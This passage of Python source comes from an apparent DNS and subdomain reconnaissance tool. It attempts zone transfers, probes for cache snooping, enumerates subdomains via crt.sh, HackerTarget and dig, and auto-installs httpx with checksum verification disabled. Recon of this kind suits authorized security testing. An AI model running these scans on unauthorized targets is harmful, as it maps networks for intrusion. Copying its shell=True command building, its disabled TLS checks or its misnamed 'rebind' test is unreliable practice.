            print(f"{Colors.GREEN}   • Restrict zone transfers to specific IPs{Colors.RESET}")
            print(f"{Colors.GREEN}   • Use TSIG (Transaction SIGnature) for authentication{Colors.RESET}")
            print(f"{Colors.GREEN}   • Disable unnecessary zone transfers{Colors.RESET}")
            print(f"{Colors.GREEN}   • Use firewall rules to restrict DNS queries{Colors.RESET}")
            print(f"{Colors.GREEN}   • Implement DNS Security Extensions (DNSSEC){Colors.RESET}")
            print(f"{Colors.GREEN}   • Monitor for unauthorized zone transfer attempts{Colors.RESET}")
            
            # ============ Generate Comprehensive Report ============
            self.generate_zone_transfer_report(zone_transfer_results, real_zone_transfers)
        else:
            print(f"\n{Colors.GREEN}✅ SECURE: No zone transfer vulnerability found!{Colors.RESET}")
            print(f"{Colors.GREEN}   All tested nameservers are properly configured.{Colors.RESET}")
        
        # ============ Save Results ============
        self.save_zone_transfer_results(zone_transfer_results, successful_transfers)
        
        return successful_transfers > 0
    
    def test_nameserver_reachability(self, nameserver):
        """Test if nameserver is reachable on port 53"""
        try:
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            sock.sendto(b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01', (nameserver, 53))
            sock.close()
            return True
        except:
            return False
    
    def run_dig_zone_transfer_deep(self, cmd, nameserver, method):
        """Run dig zone transfer with deep verification"""
        print(f"{Colors.YELLOW}      ⏳ Executing: {cmd[:80]}...{Colors.RESET}")
        
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                records = []
                has_soa = False
                has_ns = False
                has_axfr = False
                
                for line in lines:
                    line = line.strip()
                    if line and not line.startswith(';') and not line.startswith('#'):
                        if 'AXFR' in line:
                            has_axfr = True
                            continue
                        if 'SOA' in line:
                            has_soa = True
                            records.append(line)
                        elif 'NS' in line:
                            has_ns = True
                            records.append(line)
                        elif 'A' in line and 'CNAME' not in line:
                            records.append(line)
                        elif 'CNAME' in line:
                            records.append(line)
                        elif 'MX' in line:
                            records.append(line)
                        elif 'TXT' in line:
                            records.append(line)
                        else:
                            if line and not line.startswith(';'):
                                records.append(line)
                
                # Filter out transfer failed messages
                records = [r for r in records if 'failed' not in r.lower() and 'error' not in r.lower()]
                
                # Check if this is a real zone transfer
                is_real_axfr = has_soa and has_ns and len(records) > 3 and has_axfr
                
                if records:
                    return records, is_real_axfr
                else:
                    return None, False
            else:
                if 'Transfer failed' in result.stderr or 'REFUSED' in result.stderr or 'NOTIMP' in result.stderr:
                    print(f"{Colors.YELLOW}      ⚠️ Zone transfer refused (Server is secure){Colors.RESET}")
                    return None, False
                else:
                    print(f"{Colors.YELLOW}      ⚠️ Command failed (exit code: {result.returncode}){Colors.RESET}")
                    return None, False
                    
        except subprocess.TimeoutExpired:
            print(f"{Colors.YELLOW}      ⏱️ Command timed out{Colors.RESET}")
            return None, False
        except Exception as e:
            print(f"{Colors.RED}      ❌ Error: {str(e)[:80]}{Colors.RESET}")
            return None, False
    
    def run_nslookup_zone_transfer_deep(self, cmd, nameserver):
        """Run nslookup zone transfer with deep verification"""
        print(f"{Colors.YELLOW}      ⏳ Executing: {cmd[:80]}...{Colors.RESET}")
        
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                records = []
                has_addresses = False
                has_nameservers = False
                
                for line in lines:
                    line = line.strip()
                    if line:
                        if 'Address:' in line or 'address' in line.lower():
                            has_addresses = True
                            records.append(line)
                        if 'nameserver' in line.lower():
                            has_nameservers = True
                            records.append(line)
                        if 'mail exchanger' in line.lower():
                            records.append(line)
                        if 'has address' in line.lower():
                            records.append(line)
                        if re.search(r'\d+\.\d+\.\d+\.\d+', line):
                            records.append(line)
                
                # Check if this is a real zone transfer
                is_real_axfr = has_addresses and len(records) > 5
                
                if records:
                    return records, is_real_axfr
                else:
                    return None, False
            else:
                return None, False
                
        except subprocess.TimeoutExpired:
            print(f"{Colors.YELLOW}      ⏱️ Command timed out{Colors.RESET}")
            return None, False
        except Exception as e:
            print(f"{Colors.RED}      ❌ Error: {str(e)[:80]}{Colors.RESET}")
            return None, False
    
    def run_host_zone_transfer_deep(self, cmd, nameserver):
        """Run host -l zone transfer with deep verification"""
        print(f"{Colors.YELLOW}      ⏳ Executing: {cmd[:80]}...{Colors.RESET}")
        
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                records = []
                has_soa = False
                has_ns = False
                
                for line in lines:
                    line = line.strip()
                    if line:
                        if 'has SOA record' in line:
                            has_soa = True
                            records.append(line)
                        if 'name server' in line:
                            has_ns = True
                            records.append(line)
                        if 'has address' in line or 'mail is handled' in line:
                            records.append(line)
                        elif ' ' in line and len(line) > 20:
                            records.append(line)
                
                is_real_axfr = has_soa and has_ns and len(records) > 3
                
                if records:
                    return records, is_real_axfr
                else:
                    return None, False
            else:
                return None, False
                
        except subprocess.TimeoutExpired:
            print(f"{Colors.YELLOW}      ⏱️ Command timed out{Colors.RESET}")
            return None, False
        except Exception as e:
            print(f"{Colors.RED}      ❌ Error: {str(e)[:80]}{Colors.RESET}")
            return None, False
    
    def python_zone_transfer_deep(self, nameserver):
        """Python DNS library zone transfer with deep verification"""
        print(f"{Colors.YELLOW}      ⏳ Using Python DNS library...{Colors.RESET}")
        
        try:
            import dns.query
            import dns.zone
            import dns.resolver
            
            try:
                ns_ip = dns.resolver.resolve(nameserver, 'A')[0].address
            except:
                ns_ip = nameserver
            
            try:
                zone = dns.zone.from_xfr(dns.query.xfr(ns_ip, self.clean_target))
                records = []
                has_soa = False
                
                for name, node in zone.nodes.items():
                    rdatasets = node.rdatasets
                    for rdataset in rdatasets:
                        for rdata in rdataset:
                            record_str = f"{name} {rdataset.rdclass} {rdataset.rdtype} {rdata}"
                            records.append(str(record_str))
                            if 'SOA' in str(rdataset.rdtype):
                                has_soa = True
                
                is_real_axfr = has_soa and len(records) > 3
                
                if records:
                    return records, is_real_axfr
                else:
                    return None, False
                    
            except dns.query.TransferError:
                print(f"{Colors.YELLOW}      ⚠️ Zone transfer refused (Server is secure){Colors.RESET}")
                return None, False
            except Exception as e:
                print(f"{Colors.YELLOW}      ⚠️ Python zone transfer failed: {str(e)[:80]}{Colors.RESET}")
                return None, False
                
        except ImportError:
            print(f"{Colors.YELLOW}      ⚠️ dnspython not installed. Skipping Python method.{Colors.RESET}")
            return None, False
        except Exception as e:
            print(f"{Colors.YELLOW}      ⚠️ Python method error: {str(e)[:80]}{Colors.RESET}")
            return None, False
    
    def test_dns_rebind_zone_transfer(self, nameserver):
        """Test DNS Rebind Attack for zone transfer"""
        print(f"{Colors.YELLOW}      ⏳ Testing DNS Rebind Attack...{Colors.RESET}")
        
        try:
            # Try to get zone using DNS rebind technique
            # Multiple queries with different source IPs
            import socket
            import random
            
            test_domains = [
                f"test1.{self.clean_target}",
                f"test2.{self.clean_target}",
                f"test3.{self.clean_target}"
            ]
            
            records = []
            for domain in test_domains:
                try:
                    # Try with different DNS servers
                    for dns_server in [nameserver, '8.8.8.8', '1.1.1.1']:
                        cmd = f"dig @{dns_server} {domain} A +short"
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
                        if result.stdout.strip():
                            records.append(f"{domain} -> {result.stdout.strip()}")
                            break
                except:
                    pass
            
            if records and len(records) > 1:
                return records, False  # Not real AXFR, but shows vulnerability
            else:
                return None, False
                
        except Exception as e:
            print(f"{Colors.YELLOW}      ⚠️ DNS Rebind test failed: {str(e)[:80]}{Colors.RESET}")
            return None, False
    
    def test_dns_cache_snooping(self, nameserver):
        """Test DNS Cache Snooping"""
        print(f"{Colors.YELLOW}      ⏳ Testing DNS Cache Snooping...{Colors.RESET}")
        
        try:
            # Check if nameserver caches DNS responses
            test_domains = [
                f"cached1.{self.clean_target}",
                f"cached2.{self.clean_target}"
            ]
            
            cache_results = []
            for domain in test_domains:
                try:
                    # First query (should hit cache)
                    cmd1 = f"dig @{nameserver} {domain} A +norecurse"
                    result1 = subprocess.run(cmd1, shell=True, capture_output=True, text=True, timeout=5)
                    
                    # Check if response shows cached result
                    if 'ANSWER' in result1.stdout and 'SOA' not in result1.stdout:
                        cache_results.append(f"{domain} -> Cached")
                    else:
                        cache_results.append(f"{domain} -> Not Cached")
                except:
                    pass
            
            if cache_results:
                return cache_results
            else:
                return None
                
        except Exception as e:
            print(f"{Colors.YELLOW}      ⚠️ Cache snooping failed: {str(e)[:80]}{Colors.RESET}")
            return None
    
    def extract_subdomains_from_zone(self, records):
        """Extract all subdomains from zone transfer records"""
        subdomains = []
        for record in records:
            # Look for subdomain patterns
            if ' ' in record:
                parts = record.split()
                for part in parts:
                    if '.' in part and self.clean_target in part:
                        if not part.startswith(';') and not part.startswith('#'):
                            subdomains.append(part)
        return list(set(subdomains))
    
    def extract_ips_from_zone(self, records):
        """Extract all IP addresses from zone transfer records"""
        ips = []
        for record in records:
            ip_matches = re.findall(r'\d+\.\d+\.\d+\.\d+', record)
            for ip in ip_matches:
                if ip and ip not in ips:
                    ips.append(ip)
        return ips
    
    def extract_mx_from_zone(self, records):
        """Extract MX records from zone transfer"""
        mx_records = []
        for record in records:
            if 'MX' in record or 'mail' in record.lower():
                mx_records.append(record)
        return mx_records
    
    def extract_txt_from_zone(self, records):
        """Extract TXT records from zone transfer"""
        txt_records = []
        for record in records:
            if 'TXT' in record or 'text' in record.lower():
                txt_records.append(record)
        return txt_records
    
    def extract_cname_from_zone(self, records):
        """Extract CNAME records from zone transfer"""
        cname_records = []
        for record in records:
            if 'CNAME' in record:
                cname_records.append(record)
        return cname_records
    
    def check_internal_ips(self, ips):
        """Check for internal/private IP addresses"""
        internal_ips = []
        for ip in ips:
            if ip.startswith('10.') or ip.startswith('172.') or ip.startswith('192.168.') or ip.startswith('127.'):
                internal_ips.append(ip)
        return internal_ips
    
    def generate_zone_transfer_report(self, results, real_transfers):
        """Generate comprehensive zone transfer report"""
        report_file = f"{self.results_dir}/zone_transfer_detailed_report.txt"
        
        with open(report_file, 'w') as f:
            f.write("="*70 + "\n")
            f.write("DNS ZONE TRANSFER DETAILED REPORT\n")
            f.write("="*70 + "\n")
            f.write(f"Target: {self.clean_target}\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("="*70 + "\n\n")
            
            if real_transfers:
                f.write("⚠️  ⚠️  ⚠️  ZONE TRANSFER VULNERABILITY CONFIRMED! ⚠️  ⚠️  ⚠️\n")
                f.write("This DNS server is MISCONFIGURED!\n")
                f.write("="*70 + "\n\n")
                
                for zt in real_transfers:
                    f.write(f"Nameserver: {zt['nameserver']}\n")
                    f.write(f"Method: {zt['method']}\n")
                    f.write(f"Records Found: {len(zt['records'])}\n")
                    f.write("-"*50 + "\n")
                    
                    # Subdomains
                    subdomains = self.extract_subdomains_from_zone(zt['records'])
                    if subdomains:
                        f.write(f"\nSubdomains Found ({len(subdomains)}):\n")
                        for sub in sorted(subdomains):
                            f.write(f"  - {sub}\n")
                    
                    # IPs
                    ips = self.extract_ips_from_zone(zt['records'])
                    if ips:
                        f.write(f"\nIP Addresses Found ({len(ips)}):\n")
                        for ip in sorted(ips):
                            f.write(f"  - {ip}\n")
                    
                    # Internal IPs
                    internal_ips = self.check_internal_ips(ips)
                    if internal_ips:
                        f.write(f"\n⚠️ INTERNAL IPs Found ({len(internal_ips)}):\n")
                        for ip in sorted(internal_ips):
                            f.write(f"  - {ip}\n")
                    
                    # MX Records
                    mx_records = self.extract_mx_from_zone(zt['records'])
                    if mx_records:
                        f.write(f"\nMX Records Found ({len(mx_records)}):\n")
                        for mx in mx_records:
                            f.write(f"  - {mx}\n")
                    
                    # TXT Records
                    txt_records = self.extract_txt_from_zone(zt['records'])
                    if txt_records:
                        f.write(f"\nTXT Records Found ({len(txt_records)}):\n")
                        for txt in txt_records:
                            f.write(f"  - {txt}\n")
                    
                    f.write("\n" + "="*70 + "\n\n")
            
            # Recommendations
            f.write("\n" + "="*70 + "\n")
            f.write("RECOMMENDATIONS\n")
            f.write("="*70 + "\n")
            f.write("1. Restrict zone transfers to specific IP addresses\n")
            f.write("2. Use TSIG (Transaction SIGnature) for authentication\n")
            f.write("3. Disable unnecessary zone transfers\n")
            f.write("4. Use firewall rules to restrict DNS queries\n")
            f.write("5. Implement DNS Security Extensions (DNSSEC)\n")
            f.write("6. Monitor for unauthorized zone transfer attempts\n")
            f.write("7. Regular security audits of DNS configuration\n")
            f.write("8. Use DNS response rate limiting (RRL)\n")
        
        print(f"\n{Colors.CYAN}📁 Detailed report generated: {report_file}{Colors.RESET}")



    # ==================== SUBFINDER ====================
    def run_subfinder_all(self):
        print(f"\n{Colors.CYAN}🔍 SUBFINDER - ALL OPTIONS{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*60}{Colors.RESET}")

        if not self.check_and_install_tool('subfinder'):
            print(f"{Colors.RED}❌ Subfinder not available{Colors.RESET}")
            return []

        print(f"{Colors.CYAN}📥 Running full scan...{Colors.RESET}")
        cmd = (f"subfinder -d {self.clean_target} "
               f"-o {self.results_dir}/subfinder_all.txt "
               f"-all -silent -t 50 -timeout 30 -max-time 300 "
               f"-r 8.8.8.8,1.1.1.1 -recursive "
               f"-exclude-sources alienvault,zoomeye -nW -pc -ps -s "
               f"-config config.yaml")

        output = self.run_command(cmd, "SUBFINDER - Full scan", use_proxy=False)
        if output:
            subdomains = output.splitlines()
            self.subdomains.extend(subdomains)
            print(f"{Colors.GREEN}✅ Found {len(subdomains)} subdomains (full scan){Colors.RESET}")
            return subdomains

        print(f"{Colors.YELLOW}⚠️ Full scan failed, trying simple scan...{Colors.RESET}")
        return self.run_subfinder_simple()

    def run_subfinder_simple(self):
        print(f"{Colors.CYAN}📥 Running simple scan...{Colors.RESET}")
        cmd = (f"subfinder -d {self.clean_target} -silent -o {self.results_dir}/subfinder_simple.txt")
        output = self.run_command(cmd, "SUBFINDER - Simple", use_proxy=False)
        if output:
            subdomains = output.splitlines()
            self.subdomains.extend(subdomains)
            print(f"{Colors.GREEN}✅ Found {len(subdomains)} subdomains (simple scan){Colors.RESET}")
            return subdomains
        print(f"{Colors.RED}❌ Simple scan also failed{Colors.RESET}")
        return []

    # ==================== AMASS - REPLACED WITH SUBDOMAIN SCANNER ====================
    def run_amass_all(self):
        """Replaced Amass with Subdomain Scanner (crt.sh + HackerTarget + dig)"""
        print(f"\n{Colors.CYAN}🔍 SUBDOMAIN DISCOVERY (crt.sh + HackerTarget + dig){Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*60}{Colors.RESET}")

        # Run crt.sh scan
        self.subdomain_crtsh()
        
        # Run HackerTarget scan
        self.subdomain_hackertarget()
        
        # Run dig scan
        self.subdomain_dig()
        
        # Remove duplicates
        self.subdomains = list(set(self.subdomains))
        
        if self.subdomains:
            print(f"{Colors.GREEN}✅ Found {len(self.subdomains)} subdomains{Colors.RESET}")
            with open(f"{self.results_dir}/subdomains_alt.txt", 'w') as f:
                for sub in sorted(self.subdomains):
                    f.write(f"{sub}\n")
        else:
            print(f"{Colors.YELLOW}⚠️ No subdomains found{Colors.RESET}")
        
        return self.subdomains

    # ============================================================
    # WILDCARD DETECTION & VALIDATION
    # ============================================================

    # ============================================================
    # UPDATED: Wildcard Detection with Better Display
    # ============================================================

    def check_wildcard_dns(self, domain):
        """Check if domain has wildcard DNS entry with detailed output"""
        print(f"\n{Colors.CYAN}🔍 Checking wildcard DNS for: {domain}{Colors.RESET}")
        
        import random
        import string
        
        # Test multiple random subdomains
        test_subdomains = []
        for i in range(3):
            test_sub = ''.join(random.choices(string.ascii_lowercase, k=10))
            test_subdomains.append(f"{test_sub}.{domain}")
        
        wildcard_detected = False
        wildcard_ip = None
        test_results = []
        
        for test_domain in test_subdomains:
            try:
                import socket
                ip = socket.gethostbyname(test_domain)
                main_ip = socket.gethostbyname(domain)
                
                if ip == main_ip:
                    wildcard_detected = True
                    wildcard_ip = ip
                    test_results.append(f"{Colors.RED}   ⚠️ {test_domain} -> {ip} (WILDCARD){Colors.RESET}")
                else:
                    test_results.append(f"{Colors.GREEN}   ✅ {test_domain} -> {ip} (Different IP){Colors.RESET}")
                    
            except socket.gaierror:
                test_results.append(f"{Colors.GREEN}   ✅ {test_domain} -> NXDOMAIN (No wildcard){Colors.RESET}")
            except Exception as e:
                test_results.append(f"{Colors.YELLOW}   ⚠️ {test_domain} -> Error: {str(e)[:30]}{Colors.RESET}")
        
        # Show test results
        for result in test_results:
            print(result)
        
        if wildcard_detected:
            print(f"\n{Colors.RED}{'='*70}{Colors.RESET}")
            print(f"{Colors.RED}⚠️  WILDCARD DNS DETECTED!{Colors.RESET}")
            print(f"{Colors.YELLOW}   All subdomains resolve to: {wildcard_ip}{Colors.RESET}")
            print(f"{Colors.RED}{'='*70}{Colors.RESET}")
            print(f"{Colors.BLUE}💡 This means ALL subdomains will appear valid,{Colors.RESET}")
            print(f"{Colors.BLUE}   but they all point to the same IP.{Colors.RESET}")
            return True, wildcard_ip
        else:
            print(f"\n{Colors.GREEN}✅ No wildcard DNS detected{Colors.RESET}")
            return False, None

    # ============================================================
    # UPDATED: subdomain_crtsh with Wildcard Display
    # ============================================================

    def subdomain_crtsh(self):
        """Get subdomains from crt.sh with wildcard validation and display"""
        print(f"\n{Colors.CYAN}🔍 Scanning crt.sh...{Colors.RESET}")
        
        # Check wildcard first
        has_wildcard, wildcard_ip = self.check_wildcard_dns(self.clean_target)
        
        session = requests.Session()
        retries = Retry(total=2, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
        session.mount('https://', HTTPAdapter(max_retries=retries))
        
        max_retries = 3
        retry_delay = 10
        
        all_subdomains = []
        wildcard_subdomains = []
        valid_subdomains = []
        
        for attempt in range(max_retries):
            try:
                url = f"https://crt.sh/?q=%25.{self.clean_target}&output=json"
                response = session.get(url, timeout=60, verify=False)
                
                if response.status_code == 200:
                    try:
                        data = json.loads(response.text)
                        count = 0
                        wildcard_count = 0
                        
                        print(f"\n{Colors.CYAN}📋 Processing crt.sh results...{Colors.RESET}")
                        
                        for entry in data:
                            if 'name_value' in entry:
                                names = entry['name_value'].split('\n')
                                for name in names:
                                    name = name.strip().lower()
                                    if name and name.endswith(self.clean_target):
                                        # Remove wildcard from DNS record
                                        if name.startswith('*.'):
                                            name = name[2:]
                                        
                                        if name not in all_subdomains:
                                            all_subdomains.append(name)
                                            
                                            # Check if it's a wildcard
                                            if has_wildcard:
                                                try:
                                                    import socket
                                                    ip = socket.gethostbyname(name)
                                                    if ip == wildcard_ip:
                                                        wildcard_subdomains.append(name)
                                                        wildcard_count += 1
                                                        if wildcard_count <= 10:
                                                            print(f"{Colors.YELLOW}   ⚠️ WILDCARD: {name} -> {ip}{Colors.RESET}")
                                                        continue
                                                except:
                                                    pass
                                            
                                            valid_subdomains.append(name)
                                            count += 1
                                            if count <= 20:
                                                print(f"{Colors.GREEN}   ✅ Found: {name}{Colors.RESET}")
                        
                        # ===== SHOW SUMMARY =====
                        print(f"\n{Colors.MAGENTA}{'='*70}{Colors.RESET}")
                        print(f"{Colors.BOLD}📊 CRT.SH RESULTS SUMMARY{Colors.RESET}")
                        print(f"{Colors.MAGENTA}{'='*70}{Colors.RESET}")
                        print(f"{Colors.CYAN}Total subdomains found: {len(all_subdomains)}{Colors.RESET}")
                        print(f"{Colors.GREEN}✅ Valid subdomains: {len(valid_subdomains)}{Colors.RESET}")
                        print(f"{Colors.YELLOW}⚠️ Wildcard subdomains: {len(wildcard_subdomains)}{Colors.RESET}")
                        
                        if has_wildcard:
                            print(f"\n{Colors.RED}⚠️  WILDCARD DNS ACTIVE{Colors.RESET}")
                            print(f"{Colors.YELLOW}   Wildcard IP: {wildcard_ip}{Colors.RESET}")
                            print(f"{Colors.BLUE}   All subdomains with this IP are wildcards{Colors.RESET}")
                        
                        # ===== SHOW WILDCARD SUBDOMAINS =====
                        if wildcard_subdomains:
                            print(f"\n{Colors.YELLOW}📋 Wildcard Subdomains (filtered out):{Colors.RESET}")
                            for i, sub in enumerate(wildcard_subdomains[:20], 1):
                                print(f"{Colors.YELLOW}   {i}. {sub}{Colors.RESET}")
                            if len(wildcard_subdomains) > 20:
                                print(f"{Colors.YELLOW}   ... and {len(wildcard_subdomains)-20} more{Colors.RESET}")
                            
                            # Save wildcard subdomains
                            with open(f"{self.results_dir}/wildcard_subdomains.txt", 'w') as f:
                                for sub in sorted(wildcard_subdomains):
                                    f.write(f"{sub}\n")
                            print(f"{Colors.CYAN}📁 Wildcard subdomains saved: {self.results_dir}/wildcard_subdomains.txt{Colors.RESET}")
                        
                        # ===== SHOW VALID SUBDOMAINS =====
                        if valid_subdomains:
                            print(f"\n{Colors.GREEN}📋 Valid Subdomains:{Colors.RESET}")
                            for i, sub in enumerate(valid_subdomains[:20], 1):
                                print(f"{Colors.GREEN}   {i}. {sub}{Colors.RESET}")
                            if len(valid_subdomains) > 20:
                                print(f"{Colors.YELLOW}   ... and {len(valid_subdomains)-20} more{Colors.RESET}")
                            
                            # Save valid subdomains
                            with open(f"{self.results_dir}/valid_subdomains.txt", 'w') as f:
                                for sub in sorted(valid_subdomains):
                                    f.write(f"{sub}\n")
                            print(f"{Colors.CYAN}📁 Valid subdomains saved: {self.results_dir}/valid_subdomains.txt{Colors.RESET}")
                        
                        # ===== FINAL VERDICT =====
                        if has_wildcard and not valid_subdomains:
                            print(f"\n{Colors.RED}⚠️  ALL subdomains are WILDCARD!{Colors.RESET}")
                            print(f"{Colors.YELLOW}   This domain has wildcard DNS enabled.{Colors.RESET}")
                            print(f"{Colors.BLUE}   No valid unique subdomains found.{Colors.RESET}")
                            print(f"{Colors.BLUE}   Subdomain enumeration will not work for this domain.{Colors.RESET}")
                        
                        # Set self.subdomains to valid ones only
                        self.subdomains = valid_subdomains
                        
                        return count
                        
                    except json.JSONDecodeError:
                        print(f"{Colors.YELLOW}⚠️ Failed to parse JSON response{Colors.RESET}")
                        return 0
                        
                else:
                    print(f"{Colors.YELLOW}⚠️ crt.sh returned status: {response.status_code}{Colors.RESET}")
                    if attempt < max_retries - 1:
                        print(f"{Colors.YELLOW}   Waiting {retry_delay} seconds...{Colors.RESET}")
                        time.sleep(retry_delay)
                        continue
                    return 0
                    
            except Exception as e:
                print(f"{Colors.RED}❌ crt.sh error: {str(e)[:50]}{Colors.RESET}")
                if attempt < max_retries - 1:
                    print(f"{Colors.YELLOW}   Waiting {retry_delay} seconds...{Colors.RESET}")
                    time.sleep(retry_delay)
                    continue
                return 0
        
        return 0

    def subdomain_hackertarget(self):
        """Get subdomains from HackerTarget"""
        print(f"\n{Colors.CYAN}🔍 Scanning HackerTarget...{Colors.RESET}")
        
        try:
            url = f"https://api.hackertarget.com/hostsearch/?q={self.clean_target}"
            response = requests.get(url, timeout=30)
            
            if response.status_code == 200:
                count = 0
                for line in response.text.split('\n'):
                    if ',' in line:
                        domain = line.split(',')[0].strip()
                        if domain and domain.endswith(self.clean_target):
                            if domain not in self.subdomains:
                                self.subdomains.append(domain)
                                count += 1
                                if count <= 20:
                                    print(f"{Colors.GREEN}   ✅ Found: {domain}{Colors.RESET}")
                print(f"{Colors.GREEN}✅ HackerTarget: Found {count} subdomains{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}⚠️ HackerTarget returned status: {response.status_code}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.YELLOW}⚠️ HackerTarget error: {str(e)[:50]}{Colors.RESET}")

    def subdomain_dig(self):
        """Get subdomains using dig"""
        print(f"\n{Colors.CYAN}🔍 Scanning with dig...{Colors.RESET}")
        
        common = ['www', 'mail', 'ftp', 'ns1', 'ns2', 'webmail', 'admin', 'test', 
                  'dev', 'staging', 'api', 'blog', 'shop', 'support', 'help', 'docs',
                  'status', 'info', 'news', 'media', 'images', 'video', 'download',
                  'upload', 'login', 'secure', 'app', 'cloud', 'portal', 'dashboard',
                  'auth', 'cdn', 'static', 'assets', 'backup', 'm', 'mobile', 'web',
                  'forum', 'community', 'store', 'cart', 'checkout', 'payment']
        
        count = 0
        for sub in common:
            try:
                cmd = f"dig {sub}.{self.clean_target} +short"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
                if result.stdout.strip():
                    full_name = f"{sub}.{self.clean_target}"
                    if full_name not in self.subdomains:
                        self.subdomains.append(full_name)
                        count += 1
                        print(f"{Colors.GREEN}   ✅ Found: {full_name}{Colors.RESET}")
            except:
                pass
        print(f"{Colors.GREEN}✅ dig: Found {count} subdomains{Colors.RESET}")

    # ==================== HTTPX ====================
    # ==================== HTTPX ====================
    def check_and_install_httpx(self):
        """Check and install HTTPX automatically"""
        print(f"\n{Colors.CYAN}🔍 Checking HTTPX...{Colors.RESET}")
        
        # Check if httpx exists in PATH
        try:
            subprocess.run(['httpx', '-version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{Colors.GREEN}✅ HTTPX is already installed{Colors.RESET}")
            return True
        except:
            pass
        
        # Check if httpx exists in ~/go/bin
        httpx_path = os.path.expanduser("~/go/bin/httpx")
        if os.path.exists(httpx_path):
            print(f"{Colors.GREEN}✅ HTTPX found at {httpx_path}{Colors.RESET}")
            go_bin = os.path.expanduser("~/go/bin")
            if go_bin not in os.environ['PATH']:
                os.environ['PATH'] = go_bin + os.pathsep + os.environ['PATH']
            return True
        
        # If not found, install
        print(f"{Colors.YELLOW}⚠️ HTTPX not found. Installing...{Colors.RESET}")
        
        # Step 1: Check and install Go if needed
        try:
            subprocess.run(['go', 'version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{Colors.GREEN}✅ Go is installed{Colors.RESET}")
        except:
            print(f"{Colors.YELLOW}⚠️ Go not found. Installing Go...{Colors.RESET}")
            subprocess.run("sudo apt update -y", shell=True, check=False)
            subprocess.run("sudo apt install golang-go -y", shell=True, check=False)
            print(f"{Colors.GREEN}✅ Go installed{Colors.RESET}")
        
        # Step 2: Set Go environment
        go_bin = os.path.expanduser("~/go/bin")
        os.environ['PATH'] = go_bin + os.pathsep + os.environ['PATH']
        os.environ['PATH'] = os.environ['PATH'] + os.pathsep + "/usr/local/go/bin"
        
        # Step 3: Install HTTPX
        print(f"{Colors.CYAN}📥 Installing HTTPX...{Colors.RESET}")
        install_cmd = "go env -w GOPROXY=direct && go env -w GOSUMDB=off && go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest"
        result = subprocess.run(install_cmd, shell=True, capture_output=True, text=True, timeout=300)
        
        if result.returncode == 0:
            print(f"{Colors.GREEN}✅ HTTPX installed successfully{Colors.RESET}")
            return True
        else:
            print(f"{Colors.RED}❌ HTTPX installation failed{Colors.RESET}")
            if result.stderr:
                print(f"{Colors.RED}   Error: {result.stderr[:200]}{Colors.RESET}")
            return False

    def run_httpx_all(self):
        """Run HTTPX - Per-domain scanning with timeout (like test script)"""
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}🔍 HTTPX - LIVE HOST DISCOVERY (PER DOMAIN){Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*70}{Colors.RESET}")

        # ============ STEP 1: Get open ports ============
        print(f"{Colors.CYAN}📋 STEP 1: Getting open ports...{Colors.RESET}")
        if hasattr(self, 'open_ports') and self.open_ports:
            open_ports = self.open_ports
            print(f"{Colors.GREEN}   ✅ Using {len(open_ports)} ports from Nmap: {', '.join(map(str, open_ports))}{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}   ⚠️ No ports from Nmap. Using default: 80,443,8080,8443{Colors.RESET}")
            open_ports = [80, 443, 8080, 8443]

        # ============ STEP 2: Collect subdomains ============
        print(f"\n{Colors.CYAN}📋 STEP 2: Collecting subdomains...{Colors.RESET}")
        all_subdomains = []
        txt_files = [f for f in os.listdir(self.results_dir) if f.endswith('.txt')]
        exclude_files = ['httpx_all.txt', 'httpx_simple.txt', 'live_hosts_list.txt', 
                         'open_ports.txt', 'whois_all.txt', 'netcraft_info.txt',
                         'subdomains_combined.txt', 'subdomains_clean.txt',
                         'nmap_scan.txt', 'nmap_scan.xml']
        
        for file_name in txt_files:
            if file_name in exclude_files:
                continue
            file_path = f"{self.results_dir}/{file_name}"
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith('#'):
                            continue
                        if 'nmap' in line.lower() or 'Subject Alternative Name' in line:
                            continue
                        if 'DNS:' in line and 'http' not in line:
                            dns_matches = re.findall(r'DNS:([a-zA-Z0-9.-]+)', line)
                            for dns_match in dns_matches:
                                if dns_match.endswith(self.clean_target) and dns_match not in all_subdomains:
                                    all_subdomains.append(dns_match)
                            continue
                        if line.endswith(self.clean_target) or line == self.clean_target:
                            if line not in all_subdomains:
                                all_subdomains.append(line)
        
        if self.subdomains:
            for sub in self.subdomains:
                if sub and sub.endswith(self.clean_target) and sub not in all_subdomains:
                    all_subdomains.append(sub)
        
        all_subdomains = list(set(all_subdomains))
        if not all_subdomains:
            print(f"{Colors.RED}❌ No subdomains found. Using target itself.{Colors.RESET}")
            all_subdomains = [self.clean_target]
        
        print(f"{Colors.GREEN}✅ Total unique subdomains: {len(all_subdomains)}{Colors.RESET}")
        print(f"{Colors.CYAN}   First 5: {', '.join(all_subdomains[:5])}{Colors.RESET}")

        # ============ STEP 3: Check HTTPX ============
        print(f"\n{Colors.CYAN}🔍 STEP 3: Checking HTTPX...{Colors.RESET}")
